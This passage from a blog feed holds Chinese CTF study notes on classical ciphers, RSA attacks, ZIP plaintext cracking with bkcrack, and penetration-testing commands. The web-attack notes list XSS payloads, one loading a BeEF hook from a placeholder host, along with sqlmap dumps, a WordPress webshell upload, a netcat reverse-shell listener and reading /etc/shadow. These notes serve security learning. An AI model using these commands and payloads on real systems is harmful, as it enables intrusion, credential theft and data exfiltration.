href="https://blog.csdn.net/Makboli/article/details/126464442">1</a><a href="https://baike.baidu.com/item/%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81/228209">2</a><a href="https://blog.csdn.net/qq_52828510/article/details/122563626">3</a></p><p>栅栏密码是一种简单的替换式密码</p><p>加密过程</p><p>以明文 “THIS IS ZHISHITOM” 为例，去除空格后得到 “THISISZHISHITOM”。如果设置栏数为3进行加密，加密过程如下：</p><ul><li>第一组：T H I S I</li><li>第二组：S Z H I S</li><li>第三组：H I T O M</li></ul><p>按列取出字母得到：TSH HZI IHT SIO ISM，然后将这些字母连在一起，形成加密后的密文 “TSHHZIIHTSIOISM”。</p><p>解密过程</p><p>解密是加密过程的逆过程。对于上述加密后的密文 “TSHHZIIHTSIOISM”，首先将其分割成与加密时相同数量的组：</p><ul><li>T S H</li><li>H Z I</li><li>I H T</li><li>S I O</li><li>I S M</li></ul><p>然后按列顺序取字母，得到解密后的明文 “THISISZHISHITOM”。</p><h2 id="3-Rabbit加解密算法："><a href="#3-Rabbit加解密算法：" class="headerlink" title="3.Rabbit加解密算法："></a>3.Rabbit加解密算法：</h2><p>Rabbit 是一种<strong>流密码算法</strong>（像 “无限长的密码本”，逐位生成密钥流和明文混合），用大白话讲就是：</p><ol><li><strong>准备 “密码本”</strong>：用一个密钥（比如 16 字节的字符串）初始化算法，生成一个 “动态变化的序列”（密钥流）；</li><li><strong>加密</strong>：把明文的每个字节，和密钥流的对应字节做 “异或” 运算（简单的二进制位运算），得到密文；</li><li><strong>解密</strong>：用同样的密钥生成一模一样的密钥流，再把密文和密钥流做异或，就能还原出明文。</li></ol><p>核心特点：<strong>速度快、密钥短（通常 128 位）</strong>，CTF 里偶尔会遇到，但不如 AES、DES 常见。</p>]]></content>
      
      
      <categories>
          
          <category> ctf学习 </category>
          
          <category> crypto </category>
          
          <category> rsa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碰到的一些密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ook_code</title>
      <link href="/posts/9f361975.html"/>
      <url>/posts/9f361975.html</url>
      
        <content type="html"><![CDATA[<h2 id="Ook编码详解"><a href="#Ook编码详解" class="headerlink" title="Ook编码详解"></a>Ook编码详解</h2><h2 id="Ook编码详解-1"><a href="#Ook编码详解-1" class="headerlink" title="Ook编码详解"></a><a href="https://ctf.bugku.com/tool/brainfuck">Ook编码详解</a></h2><p><a href="https://ctf.bugku.com/tool/brainfuck">1</a></p><p><a href="https://blog.csdn.net/m0_47311097/article/details/144930147">2</a></p><p><a href="https://www.cnblogs.com/harmor/p/17279609.html">3</a></p><p><strong>Ook!</strong> 是一种基于极简主义设计的编程语言，属于 esolang（怪异语言）的一种。它是从 <strong>Brainfuck</strong> 演变而来的，主要用于编码和解码任务。Ook! 的指令由简单的短语组成，例如 <em>Ook. Ook?</em> 或 <em>Ook! Ook!</em>，这些短语对应 Brainfuck 的操作符。</p><p>编码规则</p><p>Ook! 使用一组固定的短语来表示操作符，每个短语由两个单词组成。以下是 Ook! 和 Brainfuck 的对应关系：</p><ul><li><em>Ook. Ook.</em> 对应 <em>&gt;</em>（指针右移）</li><li><em>Ook! Ook!</em> 对应 <em>&lt;</em>（指针左移）</li><li><em>Ook. Ook!</em> 对应 <em>+</em>（当前单元格值加一）</li><li><em>Ook! Ook.</em> 对应 <em>-</em>（当前单元格值减一）</li><li><em>Ook! Ook?</em> 对应 <em>[</em>（循环开始）</li><li><em>Ook? Ook!</em> 对应 <em>]</em>（循环结束）</li><li><em>Ook. Ook?</em> 对应 <em>.</em>（输出当前单元格值）</li><li><em>Ook? Ook.</em> 对应 <em>,</em>（输入值到当前单元格）</li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf学习 </category>
          
          <category> crypto </category>
          
          <category> ook编码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碰到的一些编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rsa</title>
      <link href="/posts/96931ed7.html"/>
      <url>/posts/96931ed7.html</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="RSA-核心笔记"><a href="#RSA-核心笔记" class="headerlink" title="RSA 核心笔记"></a>RSA 核心笔记</h2><h2 id="一、加解密核心公式"><a href="#一、加解密核心公式" class="headerlink" title="一、加解密核心公式"></a>一、加解密核心公式</h2><h3 id="1-密钥生成"><a href="#1-密钥生成" class="headerlink" title="1. 密钥生成"></a>1. 密钥生成</h3><ol><li>选两个大质数 <code>p</code> 和 <code>q</code></li><li>计算模数 <code>n = p * q</code></li><li>计算欧拉函数 <code>φ(n) = (p-1) * (q-1)</code></li><li>选公钥 <code>e</code>，满足 <code>1 &lt; e &lt; φ(n)</code> 且 <code>e</code> 和 <code>φ(n)</code> <strong>互质</strong>（最大公约数为 1）</li><li>求私钥 <code>d</code>，满足 <code>(e * d) mod φ(n) = 1</code> → <code>d</code> 是 <code>e</code> 在模 <code>φ(n)</code> 下的逆元</li></ol><h3 id="2-加密"><a href="#2-加密" class="headerlink" title="2. 加密"></a>2. 加密</h3><p>明文 <code>m</code> → 密文 <code>c</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = m^e mod n</span><br></pre></td></tr></table></figure><h3 id="3-解密"><a href="#3-解密" class="headerlink" title="3. 解密"></a>3. 解密</h3><p>密文 <code>c</code> → 明文 <code>m</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m = c^d mod n</span><br></pre></td></tr></table></figure><hr><h2 id="二、常见攻击方式（大白话）"><a href="#二、常见攻击方式（大白话）" class="headerlink" title="二、常见攻击方式（大白话）"></a>二、常见攻击方式（大白话）</h2><h3 id="1-模数可分解攻击（最基础）"><a href="#1-模数可分解攻击（最基础）" class="headerlink" title="1. 模数可分解攻击（最基础）"></a>1. 模数可分解攻击（最基础）</h3><ul><li><p><strong>适用场景</strong>：拿到公钥 <code>(e, n)</code> 和密文 <code>c</code>，且能把 <code>n</code> 拆成 <code>p*q</code></p></li><li><p>攻击原理</p><p>：</p><ol><li>分解 <code>n = p*q</code>（CTF 里常用工具：yafu、factordb 网站）</li><li>算 <code>φ(n) = (p-1)*(q-1)</code></li><li>求 <code>e</code> 的逆元 <code>d</code> → 用 <code>d</code> 解密 <code>c</code> 得 <code>m</code></li></ol></li><li><p><strong>关键条件</strong>：<code>n</code> 能被成功分解（如果 <code>p</code> 和 <code>q</code> 太小，分解很容易）</p></li></ul><h3 id="2-共模攻击（同一-n-漏洞）"><a href="#2-共模攻击（同一-n-漏洞）" class="headerlink" title="2. 共模攻击（同一 n 漏洞）"></a>2. 共模攻击（同一 <code>n</code> 漏洞）</h3><ul><li><p><strong>适用场景</strong>：同一明文 <code>m</code>，用同一个 <code>n</code>、不同公钥 <code>e1</code>&#x2F;<code>e2</code> 加密，得到密文 <code>c1</code>&#x2F;<code>c2</code></p></li><li><p>攻击原理</p><p>：</p><ol><li>只要 <code>e1</code> 和 <code>e2</code> <strong>互质</strong>，就存在整数 <code>x</code> 和 <code>y</code>，满足 <code>e1*x + e2*y = 1</code></li><li>明文 <code>m = (c1^x * c2^y) mod n</code></li><li>遇到负数次幂 → 转成模逆（比如 <code>c1^-k = (c1^k 的逆元) mod n</code>）</li></ol></li><li><p><strong>关键条件</strong>：多个公钥共用同一个 <code>n</code>，且公钥之间互质</p></li></ul><h3 id="补充：CTF-里其他常见攻击（拓展）"><a href="#补充：CTF-里其他常见攻击（拓展）" class="headerlink" title="补充：CTF 里其他常见攻击（拓展）"></a>补充：CTF 里其他常见攻击（拓展）</h3><ol><li>低加密指数攻击（e 太小，比如 e&#x3D;3）<ul><li>场景：<code>e</code> 很小，密文 <code>c = m^3 mod n</code></li><li>原理：直接对 <code>c</code> 开立方，结果就是 <code>m</code>（不用分解 <code>n</code>）</li></ul></li><li>私钥泄露攻击<ul><li>场景：不小心泄露了私钥 <code>d</code></li><li>原理：拿到 <code>d</code> 就能直接解密任意用 <code>(e,n)</code> 加密的密文</li></ul></li></ol><hr><h2 id="三、核心总结"><a href="#三、核心总结" class="headerlink" title="三、核心总结"></a>三、核心总结</h2><table><thead><tr><th>操作</th><th>公式</th><th>关键条件</th></tr></thead><tbody><tr><td>加密</td><td><code>c = m^e mod n</code></td><td>知道公钥 <code>(e,n)</code></td></tr><tr><td>解密</td><td><code>m = c^d mod n</code></td><td>知道私钥 <code>d</code></td></tr><tr><td>模数分解攻击</td><td>分解 <code>n=p*q</code> → 求 <code>d</code></td><td><code>n</code> 可被分解</td></tr><tr><td>共模攻击</td><td><code>m=(c1^x*c2^y)mod n</code></td><td>同 <code>n</code>、多 <code>e</code>、<code>e1/e2</code> 互质</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> ctf学习 </category>
          
          <category> crypto </category>
          
          <category> rsa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dirsearch+sqlmap</title>
      <link href="/posts/15ed5e35.html"/>
      <url>/posts/15ed5e35.html</url>
      
        <content type="html"><![CDATA[<h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p>python dirsearch.py -u “http:&#x2F;&#x2F;…” -t 1 -d 5 –full-url -R 5 -w .&#x2F;ctf_high.txt</p><p>python dirsearch.py -u “http:&#x2F;&#x2F;…” -t 1 -d 5 -w .&#x2F;ctf_high.txt</p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>sqlmap -u “鐩爣URL” –tamper&#x3D;space2comment.py,base64encode.py –random-agent –delay 1</p><p>python sqlmap.py -u “http:&#x2F;&#x2F;…” –batch –risk&#x3D;3 –level&#x3D;5</p><p>sqlmap -u “http:&#x2F;&#x2F;…” –batch –risk&#x3D;3 –level&#x3D;5 –threads&#x3D;10 –dbs –dbms&#x3D;MySQL –technique&#x3D;B,U,E,T,OR –tamper&#x3D;between,space2plus,randomcase,htmlentitydecode,equaltolike</p>]]></content>
      
      
      <categories>
          
          <category> ctf学习 </category>
          
          <category> 软件使用命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dirsearch+sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notectf</title>
      <link href="/posts/1afe1991.html"/>
      <url>/posts/1afe1991.html</url>
      
        <content type="html"><![CDATA[<h2 id="ctf"><a href="#ctf" class="headerlink" title="ctf"></a>ctf</h2><h4 id="1-python-requests"><a href="#1-python-requests" class="headerlink" title="1.python requests"></a>1.python requests</h4><h4 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h4><p>2.1谷歌黑客搜索语法</p><p>fofa</p><p>github泄露源码和账号密码</p><p>2.2 主动信息收集</p><p>网站指纹识别</p><p>端口扫描</p><p>目录扫描</p><p>子域名扫描</p><p>漏洞扫描</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h4 id="3-XSS-攻击"><a href="#3-XSS-攻击" class="headerlink" title="3. XSS 攻击"></a>3. XSS 攻击</h4><p>3.1 反射型（非持久）</p><ul><li><p>特征：恶意代码通过 URL 传入，单次请求生效</p></li><li><p>常见攻击方式：</p><p>重定向：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location=&quot;恶意网址&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p> 图片加载恶意脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;http://BeEF_IP:3000/hook.js&quot;&gt;</span><br></pre></td></tr></table></figure><p> 脚本标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;恶意xss.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p> 绕过滤：大小写、URL&#x2F;Base64 编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScrIpT&gt;      URL/Base64 编码</span><br></pre></td></tr></table></figure></li></ul><p>3.2 存储型（持久）</p><ul><li>特征：恶意代码存到服务器（数据库 &#x2F; 留言板等），所有访问者中招</li><li>核心：代码提交后被持久化，影响范围更广</li></ul><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><h4 id="4-1-web——sql注入"><a href="#4-1-web——sql注入" class="headerlink" title="4.1 web——sql注入"></a>4.1 web——sql注入</h4><p>1.扫描主机服务信息以及服务版本</p><p>-q 安静模式</p><p>nmap -sV -q ip</p><p>1.1 指定扫描「Top 100 个最常用端口」（比默认 1000 个少 90%），同时保留版本探测：</p><p>nmap -sV –top-ports 100 ip</p><p>2.快速扫描 主机全部信息</p><p>nmap -T4 -A -v ip</p><p>3.探测敏感信息</p><p>nikto -host <a href="http://ip:端口">http://ip:端口</a></p><p>4.sql注入寻找漏洞</p><p>1.sqlmap -u “ip”</p><p>2.sqlmap -u “ip” –dbs</p><p>3.sqlmap -u “ip”-D “数据库名” –tables</p><p>4.sqlmap -u “ip”-D “数据库名” -T “表名” –columns</p><p>5.sqlmap -u “ip”-D “数据库名” -T “表名” -C “列名”–dump</p><p>6.sqlmap -r request.raw -level 5 -risk 3 -dbs -dbm mysql –batch</p><p>request.raw报头</p><p>5.上传webshell获取控制权</p><p>wordpress后台寻找上传点</p><p>– 主题的404.Php 可以上传</p><p>–webshell 获取 &#x2F;usr&#x2F; share&#x2F;webshells&#x2F;php&#x2F;</p><p>执行shell，获取反弹shell</p><p>http：&#x2F;&#x2F;靶场ip：端口号&#x2F;目录&#x2F;wp-content&#x2F;themes&#x2F;主题名&#x2F;404.php</p><p>启动监听</p><p>– nc -nvlp port</p><p>启动终端</p><p>– python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”</p><p>root权限</p><p>–查看敏感文件</p><p>cat&#x2F;atc&#x2F;shadow </p><p>cat&#x2F;atc&#x2F;passwd</p><p>– 使用su -提权</p><h4 id="5-文件上传漏洞"><a href="#5-文件上传漏洞" class="headerlink" title="5.文件上传漏洞"></a>5.文件上传漏洞</h4>]]></content>
      
      
      <categories>
          
          <category> ctf学习 </category>
          
          <category> 网课笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf相关 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc</title>
      <link href="/posts/7fa71aba.html"/>
      <url>/posts/7fa71aba.html</url>
      
        <content type="html"><![CDATA[<h2 id="ZIP-明文爆破笔记"><a href="#ZIP-明文爆破笔记" class="headerlink" title="ZIP 明文爆破笔记"></a>ZIP 明文爆破笔记</h2><h2 id="一、核心原理"><a href="#一、核心原理" class="headerlink" title="一、核心原理"></a>一、核心原理</h2><h3 id="1-加密逻辑（ZipCrypto-算法）"><a href="#1-加密逻辑（ZipCrypto-算法）" class="headerlink" title="1. 加密逻辑（ZipCrypto 算法）"></a>1. 加密逻辑（ZipCrypto 算法）</h3><ul><li>加密：明文 XOR 密码流 &#x3D; 密文</li><li>解密：密文 XOR 密码流 &#x3D; 明文</li><li>反推密码流：明文 XOR 密文 &#x3D; 密码流</li></ul><h3 id="2-XOR（异或）规则"><a href="#2-XOR（异或）规则" class="headerlink" title="2. XOR（异或）规则"></a>2. XOR（异或）规则</h3><p>二进制运算：相同为 0，不同为 1</p><p>例：<code>a</code>（01100001）XOR 5（00000101）&#x3D; <code>d</code>（01100100）；<code>d</code> XOR 5 又变回 <code>a</code></p><h3 id="3-明文爆破本质"><a href="#3-明文爆破本质" class="headerlink" title="3. 明文爆破本质"></a>3. 明文爆破本质</h3><p>已知明文 + 对应密文→算密码流→反推 ZIP 的 3 个核心密钥（key0&#x2F;key1&#x2F;key2）→用密钥解密整个 ZIP</p><p><strong>前提</strong>：仅对 ZIP 传统加密有效，AES256 加密无效！</p><h2 id="二、bkcrack-使用条件"><a href="#二、bkcrack-使用条件" class="headerlink" title="二、bkcrack 使用条件"></a>二、bkcrack 使用条件</h2><ol><li><p>ZIP 内文件<strong>未压缩</strong>（检查：<code>bkcrack -L 压缩包.zip</code>）</p></li><li><h5 id="已知至少12-字节明文（8-字节连续）-明文在文件中的位置（偏移）"><a href="#已知至少12-字节明文（8-字节连续）-明文在文件中的位置（偏移）" class="headerlink" title="已知至少12 字节明文（8 字节连续）+ 明文在文件中的位置（偏移）"></a>已知至少<strong>12 字节明文</strong>（8 字节连续）+ 明文在文件中的位置（偏移）</h5></li></ol><h2 id="三、题目"><a href="#三、题目" class="headerlink" title="三、题目"></a>三、题目</h2><p><strong>bkcrack 无法直接破解 ZIP 密码，必须靠 “已知明文”和“你已有密文” 反推加密密钥，再用密钥解密</strong></p><p>不管是字符明文还是文件头明文，核心是：</p><p><strong>准备明文文件 → 得密钥 → 用密钥解密</strong></p><p>区别只在 “明文来源”—— 字符明文来自题目暗示，文件头明文来自格式固定规则。</p><h3 id="题目-1：字符明文爆破（已知部分字符内容）"><a href="#题目-1：字符明文爆破（已知部分字符内容）" class="headerlink" title="题目 1：字符明文爆破（已知部分字符内容）"></a>题目 1：字符明文爆破（已知部分字符内容）</h3><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><p>题目给了加密 ZIP 包<code>flag_360.zip</code>，里面有<code>flag.txt</code>，且已知<code>flag.txt</code>里包含 “lag {16e374f6…” 这样的字符片段。</p><h4 id="步骤-1：准备已知明文"><a href="#步骤-1：准备已知明文" class="headerlink" title="步骤 1：准备已知明文"></a>步骤 1：准备已知明文</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把8个连续明文“lag&#123;16e3”存成文件（bkcrack需要文件形式的明文）</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;lag&#123;16e3&quot;</span> &gt; plain1.txt  </span><br><span class="line"><span class="comment"># 把额外明文“74f6”转成十六进制（备用，后续填到命令里）</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;74f6&quot;</span> | xxd  </span><br></pre></td></tr></table></figure><p>执行后得到 “74f6” 对应的十六进制<code>37346636</code>，记下来。</p><h4 id="步骤-2：解密钥"><a href="#步骤-2：解密钥" class="headerlink" title="步骤 2：解密钥"></a>步骤 2：解密钥</h4><p>偏移量&#x3D;你的明文第一个字符的位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C flag_360.zip  <span class="comment"># 指定要破解的ZIP包</span></span><br><span class="line">        -c flag.txt      <span class="comment"># 指定ZIP里要攻击的文件</span></span><br><span class="line">        -p plain1.txt    <span class="comment"># 用刚才存的8个连续（plaintext）明文文件</span></span><br><span class="line">        -o 1             <span class="comment"># 明文“lag&#123;16e3”在flag.txt里的起始位置是   ？偏移1</span></span><br><span class="line">        -x 29 37346636   <span class="comment"># 额外明文：偏移29的位置是“74f6”（对应十六进制）  ？</span></span><br></pre></td></tr></table></figure><p>运行后得到 3 个密钥，比如<code>b21e5df4 ab9a9430 8c336475</code>。</p><h4 id="步骤-3：解密文件"><a href="#步骤-3：解密文件" class="headerlink" title="步骤 3：解密文件"></a>步骤 3：解密文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C flag_360.zip  <span class="comment"># 原加密ZIP包</span></span><br><span class="line">        -c flag.txt      <span class="comment"># 要解密的文件</span></span><br><span class="line">        -k b21e5df4 ab9a9430 8c336475  <span class="comment"># 爆破出的密钥</span></span><br><span class="line">        -d flag.txt      <span class="comment"># 解密后保存的文件名</span></span><br></pre></td></tr></table></figure><p>打开解密后的<code>flag.txt</code>就能拿到 flag。</p><h3 id="题目-2：文件头固定明文爆破（PNG-文件）"><a href="#题目-2：文件头固定明文爆破（PNG-文件）" class="headerlink" title="题目 2：文件头固定明文爆破（PNG 文件）"></a>题目 2：文件头固定明文爆破（PNG 文件）</h3><h4 id="场景-1"><a href="#场景-1" class="headerlink" title="场景"></a>场景</h4><p>题目给了加密 ZIP 包<code>png4.zip</code>，里面有<code>2.png</code>，无其他明文信息，但知道 PNG 文件头是固定的。</p><h4 id="步骤-1：准备-PNG-固定文件头明文"><a href="#步骤-1：准备-PNG-固定文件头明文" class="headerlink" title="步骤 1：准备 PNG 固定文件头明文"></a>步骤 1：准备 PNG 固定文件头明文</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PNG文件头的固定十六进制转成二进制文件（bkcrack需要二进制明文）</span></span><br><span class="line"><span class="built_in">echo</span> 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header  //（把字符ASCII二进制转成十六进制对应二进制）</span><br></pre></td></tr></table></figure><p>（</p><p>这个<code>png_header</code>文件里存的就是 PNG 文件开头的二进制数据。</p><h4 id="步骤-2：爆破密钥"><a href="#步骤-2：爆破密钥" class="headerlink" title="步骤 2：爆破密钥"></a>步骤 2：爆破密钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C png4.zip   <span class="comment"># 指定加密ZIP包</span></span><br><span class="line">        -c 2.png      <span class="comment"># 指定ZIP里的PNG文件</span></span><br><span class="line">        -p png_header <span class="comment"># 用PNG固定文件头作为明文</span></span><br><span class="line">        -o 0          <span class="comment"># PNG文件头从偏移0开始（文件最开头）</span></span><br></pre></td></tr></table></figure><p>运行后得到密钥，比如<code>c9ce002a 9749123a 1d9079b9</code>。</p><h4 id="步骤-3：解密-PNG-文件"><a href="#步骤-3：解密-PNG-文件" class="headerlink" title="步骤 3：解密 PNG 文件"></a>步骤 3：解密 PNG 文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C png4.zip  <span class="comment"># 原加密ZIP包</span></span><br><span class="line">        -c 2.png     <span class="comment"># 要解密的PNG文件</span></span><br><span class="line">        -k c9ce002a 9749123a 1d9079b9  <span class="comment"># 爆破出的密钥</span></span><br><span class="line">        -d 2_dec.png <span class="comment"># 解密后保存的PNG文件名</span></span><br></pre></td></tr></table></figure><p>打开<code>2_dec.png</code>，里面可能藏着 flag（比如图片里的文字、隐写内容）。</p><h3 id="题目-3：JPG-文件头固定明文爆破（举一反三）"><a href="#题目-3：JPG-文件头固定明文爆破（举一反三）" class="headerlink" title="题目 3：JPG 文件头固定明文爆破（举一反三）"></a>题目 3：JPG 文件头固定明文爆破（举一反三）</h3><h4 id="场景-2"><a href="#场景-2" class="headerlink" title="场景"></a>场景</h4><p>题目给了加密 ZIP 包<code>jpg5.zip</code>，里面有<code>3.jpg</code>，无其他明文信息。</p><h4 id="步骤-1：准备-JPG-固定文件头明文"><a href="#步骤-1：准备-JPG-固定文件头明文" class="headerlink" title="步骤 1：准备 JPG 固定文件头明文"></a>步骤 1：准备 JPG 固定文件头明文</h4><p>（把字符ASCII二进制转成十六进制对应二进制）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># JPG文件头固定十六进制：FFD8FFE000104A4649460001</span></span><br><span class="line"><span class="built_in">echo</span> FFD8FFE000104A4649460001 | xxd -r -ps &gt; jpg_header</span><br></pre></td></tr></table></figure><h4 id="步骤-2：爆破密钥-1"><a href="#步骤-2：爆破密钥-1" class="headerlink" title="步骤 2：爆破密钥"></a>步骤 2：爆破密钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C jpg5.zip   <span class="comment"># 加密ZIP包</span></span><br><span class="line">        -c 3.jpg      <span class="comment"># ZIP里的JPG文件</span></span><br><span class="line">        -p jpg_header <span class="comment"># JPG固定文件头明文</span></span><br><span class="line">        -o 0          <span class="comment"># 文件头从偏移0开始</span></span><br></pre></td></tr></table></figure><h4 id="步骤-3：解密文件-1"><a href="#步骤-3：解密文件-1" class="headerlink" title="步骤 3：解密文件"></a>步骤 3：解密文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C jpg5.zip -c 3.jpg -k [爆破出的密钥] -d 3_dec.jpg</span><br></pre></td></tr></table></figure><p>打开解密后的 JPG 文件获取 flag。</p><h2 id="bf6题解："><a href="#bf6题解：" class="headerlink" title="bf6题解："></a>bf6题解：</h2><p>1.压缩包，放kali，有png，用bk</p><p>2.准备png开头 明文文件</p><p>echo 开头码 | xxd -r ps &gt; 明文文件</p><p>3.得到密钥</p><p>bkcrack -C -c -p -o</p><p>4.解密压缩文件</p><p>bkcrack -C -c -k -d</p><p>5.发现图片有隐藏的10编码，steg打开得到乱码，图片comment里面有密钥，解码后flag</p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>一个完整的 JPG 文件由 FF D8 开头，FF D9结尾<br> 在使用图片浏览器时，图片浏览器会忽略 FF D9 以后的内容，因此可以在 JPG 文件中加入其他文件。其他文件隐藏如png.gif文件隐藏也是这个道理。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ========== 前期定位工具 &amp; 切换工作目录 ==========</span></span><br><span class="line"><span class="comment"># 1. （尝试找bkcrack目录失败，改用全局查找工具路径）</span></span><br><span class="line"><span class="built_in">which</span> bkcrack  <span class="comment"># 确认bkcrack路径：/usr/local/bin/bkcrack</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 切换到桌面（二维码图片所在目录，核心工作目录）</span></span><br><span class="line"><span class="built_in">cd</span> ~/Desktop</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 1. 从二维码中分离加密ZIP包 ==========</span></span><br><span class="line"><span class="comment"># 3. 用binwalk提取二维码中隐藏的ZIP数据</span></span><br><span class="line">binwalk -e QR_code.png  <span class="comment"># 分离出加密ZIP包（偏移0x1D7，对应文件1D7.zip）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 进入分离后的目录，查看并复制ZIP包到桌面</span></span><br><span class="line"><span class="built_in">cd</span> _QR_code.png.extracted  <span class="comment"># 进入binwalk生成的提取目录</span></span><br><span class="line"><span class="built_in">ls</span>                         <span class="comment"># 查看分离出的文件：1D7.zip</span></span><br><span class="line"><span class="built_in">cp</span> 1D7.zip ~/Desktop/      <span class="comment"># 复制ZIP包到桌面（方便后续操作）</span></span><br><span class="line"><span class="built_in">cd</span> ~/Desktop               <span class="comment"># 切回桌面</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.爆破密码，打开就ok</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">原来思路：</span><br><span class="line"><span class="comment"># ========== 2. 准备明文文件（bkcrack明文攻击用） ==========</span></span><br><span class="line"><span class="comment"># 5. 创建与ZIP内同名的空白文件（4number.txt）</span></span><br><span class="line"><span class="built_in">touch</span> 4number.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 3. 尝试bkcrack明文攻击（因ZIP包不完整报错，后改用爆破） ==========</span></span><br><span class="line"><span class="comment"># 6. 执行bkcrack明文攻击（报错：ZIP缺少目录尾签名）</span></span><br><span class="line">bkcrack -C 1D7.zip -c 4number.txt -P ./ -p 4number.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># ========== 补充：你后续爆破1D7.zip的核心逻辑（可选命令） ==========</span></span><br><span class="line"><span class="comment"># （若用fcrackzip爆破4位数字密码，示例命令）</span></span><br><span class="line">fcrackzip -b -l 4-4 -u 1D7.zip  <span class="comment"># -b=爆破模式，-l 4-4=4位数字，-u=只显示正确密码</span></span><br><span class="line"><span class="comment"># 爆破成功后解压（假设密码为1234）</span></span><br><span class="line">unzip -P 1234 1D7.zip  <span class="comment"># 